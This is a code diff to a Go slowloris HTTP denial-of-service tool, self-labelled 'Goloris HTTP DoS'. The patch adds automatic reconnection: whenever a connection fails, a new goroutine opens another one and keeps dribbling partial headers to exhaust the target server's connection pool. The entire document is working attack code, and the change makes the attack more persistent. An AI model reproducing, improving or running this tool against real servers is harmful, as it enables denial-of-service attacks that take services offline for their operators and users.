@@ -10,8 +10,16 @@ import (
 	"os/signal"
 	"strings"
 	"flag"
-	"log"
 )
+
+type connectionError struct {
+	err error
+	killIndex int // index of the the kill channel in kill channel list
+}
+
+func (c *connectionError) Error() string {
+	return c.err.Error()
+}
 
 const (
 	defaultUserAgent = "Goloris HTTP DoS"
@@ -41,18 +49,29 @@ func main() {
 		target += ":80"
 	}
 
-	killchans := openConnections(target, numConnections)
-	fmt.Printf("Opened %d/%d connections succesfully\n", len(killchans), numConnections)
+	donechan := make(chan int)
+	killchans := openConnections(target, numConnections, donechan)
 
 	signal.Notify(signals, os.Interrupt, os.Kill)
-	<-signals
-	fmt.Printf("Received SIGKILL, killing connections...")
 
-	for _, killchan := range killchans {
-		killchan <- true
+loop:
+	for {
+		select {
+		case <-signals:
+			fmt.Printf("Received SIGKILL, killing connections...")
+			for _, killchan := range killchans {
+				killchan <- true
+			}
+			fmt.Printf("done\n")
+			break loop
+
+		case index := <-donechan:
+			fmt.Println("an error occured withing a connection, starting a new one")
+			kill := make(chan bool)
+			killchans[index] = kill
+			go slowloris(target, interval, kill, index, donechan)
+		}
 	}
-
-	fmt.Printf("done\n")
 }
 
 func parseParams() {
@@ -76,45 +95,34 @@ func usage() {
 
 // Open given number of connections to target and return a chan slice that
 // is used to kill the goroutines
-func openConnections(target string, num int) []chan bool {
+func openConnections(target string, num int, donechan chan int) []chan bool {
 	killchans := make([]chan bool, 0)
 
 	for i:=0; i<num; i++ {
-		done := make(chan bool)
-		errChan := make(chan error)
-
-		go func() {
-			conn, err := net.Dial("tcp", target)
-			if err != nil {
-				errChan <- err
-				return
-			} 
-			defer conn.Close()
-
-			errChan <- nil
-
-			slowloris(target, interval, done, conn)
-		}()
-
-		err := <-errChan
-		if err == nil{
-			killchans = append(killchans, done)
-		} else {
-			log.Println(err)
-		}
+		kill := make(chan bool)
+		go slowloris(target, interval, kill, i, donechan)
+		killchans = append(killchans, kill)
 	}
 
 	return killchans
 }
 
-func slowloris(target string, interval int, kill chan bool, conn net.Conn) error {
+func slowloris(target string, interval int, kill chan bool, killIndex int, donechan chan int) {
+	conn, err := net.Dial("tcp", target)
+	if err != nil {
+		donechan <- killIndex
+		return
+	} 
+	defer conn.Close()
+
 	// Send first headers
 	host := target 
 	headers := makeHeaders(host)
 	req := createRequest(host, method, resource, headers)
-	_, err := io.Copy(conn, req)
+	_, err = io.Copy(conn, req)
 	if err != nil {
-		return err
+		donechan <- killIndex
+		return
 	}
 
 	// Send a header every interval seconds, until an error occurs or 
@@ -128,12 +136,13 @@ func slowloris(target string, interval int, kill chan bool, conn net.Conn) error
 		case <-time.After(time.Duration(interval) * time.Second):
 			_, err := conn.Write([]byte("Cookie: a=b\r\n"))
 			if err != nil {
-				log.Println(err)
+				donechan <- killIndex
+				return
 			}
 		}
 	}
 
-	return nil
+	return
 }
 
 func createRequest(host, method, resource string, headers map[string]string) *bytes.Buffer {
